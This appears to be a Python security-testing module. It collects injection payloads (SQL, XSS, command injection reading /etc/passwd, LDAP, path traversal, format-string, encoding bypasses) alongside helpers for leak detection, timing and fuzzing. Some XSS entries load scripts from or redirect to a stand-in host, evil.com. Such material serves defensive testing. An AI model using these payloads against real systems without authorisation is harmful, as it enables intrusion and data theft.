"""
Security Testing Payloads for Injection Testing.
"""

class SecurityPayloads:
    """Collection of security testing payloads for various injection attacks."""
    
    # SQL Injection Payloads
    SQL_INJECTION = {
        'basic_or': [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR 1=1 --",
            "admin' OR '1'='1",
            "admin' OR '1'='1' --",
            "admin' OR '1'='1' #",
            "admin' OR 1=1 --",
            "admin'/**/OR/**/1=1",
            "admin' OR 'x'='x",
            "') OR ('1'='1",
            "') OR ('1'='1' --",
        ],
        'union': [
            "' UNION SELECT 1,2,3 --",
            "' UNION SELECT NULL,NULL,NULL --",
            "' UNION ALL SELECT 1,2,3 --",
            "' UNION SELECT username,password FROM users --",
            "' UNION SELECT @@version --",
            "' UNION SELECT database() --",
            "' UNION SELECT user() --",
            "admin' UNION SELECT 1,2,3 --",
            "admin' UNION SELECT NULL,NULL,NULL --",
        ],
        'time_based': [
            "'; WAITFOR DELAY '00:00:05' --",
            "' AND (SELECT COUNT(*) FROM sysobjects) > 0 WAITFOR DELAY '00:00:05' --",
            "'; SELECT SLEEP(5) --",
            "' AND SLEEP(5) --",
            "'; pg_sleep(5) --",
            "' AND pg_sleep(5) --",
            "'; BENCHMARK(5000000,MD5(1)) --",
        ],
        'error_based': [
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
            "' AND 1=CONVERT(int,(SELECT @@version)) --",
            "' AND 1=CAST((SELECT @@version) AS int) --",
            "' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables) --",
        ],
        'boolean_based': [
            "' AND 1=1 --",
            "' AND 1=2 --",
            "' AND 'a'='a",
            "' AND 'a'='b",
            "' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>64 --",
            "' AND LENGTH(database())>5 --",
        ]
    }
    
    # XSS (Cross-Site Scripting) Payloads
    XSS_PAYLOADS = {
        'script_tags': [
            "<script>alert('XSS')</script>",
            "<script>alert(\"XSS\")</script>",
            "<script>alert(`XSS`)</script>",
            "<script>confirm('XSS')</script>",
            "<script>prompt('XSS')</script>",
            "<script>document.location='http://evil.com'</script>",
            "<script src='http://evil.com/xss.js'></script>",
        ],
        'event_handlers': [
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<button onclick=alert('XSS')>Click</button>",
            "<div onmouseover=alert('XSS')>Hover</div>",
        ],
        'javascript_protocol': [
            "javascript:alert('XSS')",
            "javascript:alert(\"XSS\")",
            "javascript:confirm('XSS')",
            "javascript:prompt('XSS')",
            "javascript:document.location='http://evil.com'",
        ],
        'iframe_attacks': [
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<iframe src='http://evil.com'></iframe>",
            "<iframe onload=alert('XSS')></iframe>",
        ],
        'attribute_injection': [
            "\" onmouseover=\"alert('XSS')\"",
            "' onclick='alert(\"XSS\")'",
            "\" autofocus onfocus=\"alert('XSS')\"",
            "' style='expression(alert(\"XSS\"))'",
            "\" href=\"javascript:alert('XSS')\"",
        ]
    }
    
    # Command Injection Payloads
    COMMAND_INJECTION = [
        "; cat /etc/passwd",
        "| whoami",
        "& dir",
        "&& ls -la",
        "|| ping 127.0.0.1",
        "`id`",
        "$(whoami)",
        "; ls /",
        "| type %SYSTEMROOT%\\win.ini",
        "&& net user",
        "; uname -a",
        "| ps aux",
    ]
    
    # LDAP Injection Payloads
    LDAP_INJECTION = [
        ")(&)",
        ")(|(objectClass=*))",
        "))(|(objectClass=*",
        "*)(&(objectClass=*",
        ")(&(objectClass=*)(objectClass=*))",
        ")(&)",
        "*)|(objectClass=*",
        "admin)(&(password=*))",
        "*)(uid=*))(|(uid=*",
    ]
    
    # Path Traversal Payloads
    PATH_TRAVERSAL = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "/etc/passwd%00",
        "....\\\\....\\\\....\\\\etc\\\\passwd",
    ]
    
    # Format String Payloads
    FORMAT_STRING = [
        "%s%s%s%s%s%s%s%s%s%s%s%s",
        "%x%x%x%x%x%x%x%x%x%x%x%x",
        "%n%n%n%n%n%n%n%n%n%n%n%n",
        "%08x.%08x.%08x.%08x.%08x",
        "AAAA%08x.%08x.%08x.%08x.%08x",
        "%d%d%d%d%d%d%d%d%d%d%d%d",
        "%c%c%c%c%c%c%c%c%c%c%c%c",
    ]
    
    # Null Byte Injection
    NULL_BYTE = [
        "\x00",
        "%00",
        "\u0000",
        "%00.txt",
        "\x00\x00\x00",
        "admin\x00",
        "admin%00",
        "password\x00extra",
    ]
    
    # Encoding Bypass Payloads
    ENCODING_BYPASS = {
        'url_encoded': [
            "%27%20OR%20%271%27%3D%271",  # ' OR '1'='1
            "%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E",  # <script>alert('XSS')</script>
            "%22%3E%3Cscript%3Ealert%28%29%3C/script%3E",  # "><script>alert()</script>
        ],
        'double_url_encoded': [
            "%2527%2520OR%2520%25271%2527%253D%25271",
            "%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C/script%253E",
        ],
        'unicode': [
            "\u0027\u0020OR\u0020\u0027\u0031\u0027\u003D\u0027\u0031",  # ' OR '1'='1
            "\u003Cscript\u003Ealert\u0028\u0027XSS\u0027\u0029\u003C/script\u003E",
        ],
        'html_entities': [
            "&#39; OR &#39;1&#39;=&#39;1",
            "&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;",
            "&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;",
        ]
    }
    
    # Buffer Overflow Simulation
    BUFFER_OVERFLOW = {
        'small': "A" * 100,
        'medium': "A" * 1000,
        'large': "A" * 10000,
        'huge': "A" * 100000,
    }
    
    @classmethod
    def get_all_sql_payloads(cls):
        """Get all SQL injection payloads."""
        all_payloads = []
        for category in cls.SQL_INJECTION.values():
            all_payloads.extend(category)
        return all_payloads
    
    @classmethod
    def get_all_xss_payloads(cls):
        """Get all XSS payloads."""
        all_payloads = []
        for category in cls.XSS_PAYLOADS.values():
            all_payloads.extend(category)
        return all_payloads
    
    @classmethod
    def get_critical_payloads(cls):
        """Get most critical payloads for quick testing."""
        return {
            'sql': cls.SQL_INJECTION['basic_or'][:3],
            'xss': cls.XSS_PAYLOADS['script_tags'][:3],
            'command': cls.COMMAND_INJECTION[:3],
            'ldap': cls.LDAP_INJECTION[:3],
        }


class SecurityTestHelpers:
    """Helper functions for security testing."""
    
    @staticmethod
    def check_for_sensitive_data_leak(error_message: str) -> list:
        """Check if error message contains sensitive information."""
        sensitive_keywords = [
            'mysql', 'sql', 'database', 'table', 'column', 'syntax', 'version',
            'oracle', 'postgresql', 'sqlite', 'mongodb', 'redis',
            'error', 'exception', 'stack', 'trace', 'debug',
            'admin', 'root', 'password', 'username', 'credential',
            'path', 'directory', 'file', 'system', 'server',
            'connection', 'driver', 'port', 'host', 'localhost'
        ]
        
        found_keywords = []
        error_lower = error_message.lower()
        
        for keyword in sensitive_keywords:
            if keyword in error_lower:
                found_keywords.append(keyword)
                
        return found_keywords
    
    @staticmethod
    def measure_response_time(func, *args, **kwargs):
        """Measure response time for time-based injection detection."""
        import time
        start_time = time.time()
        result = func(*args, **kwargs)
        end_time = time.time()
        return result, (end_time - start_time)
    
    @staticmethod
    def check_for_xss_execution(page):
        """Check if XSS payload was executed."""
        try:
            # Check for alert dialogs
            page.wait_for_function("window.alert", timeout=1000)
            return True
        except:
            return False
    
    @staticmethod
    def generate_fuzzing_data(base_string: str, mutations: int = 100):
        """Generate fuzzing data for testing."""
        import random
        import string
        
        fuzzing_data = []
        
        for _ in range(mutations):
            # Random character insertion
            pos = random.randint(0, len(base_string))
            char = random.choice(string.printable)
            mutated = base_string[:pos] + char + base_string[pos:]
            fuzzing_data.append(mutated)
            
            # Random character deletion
            if len(base_string) > 1:
                pos = random.randint(0, len(base_string) - 1)
                mutated = base_string[:pos] + base_string[pos + 1:]
                fuzzing_data.append(mutated)
            
            # Random character replacement
            pos = random.randint(0, len(base_string) - 1)
            char = random.choice(string.printable)
            mutated = base_string[:pos] + char + base_string[pos + 1:]
            fuzzing_data.append(mutated)
        
        return fuzzing_data 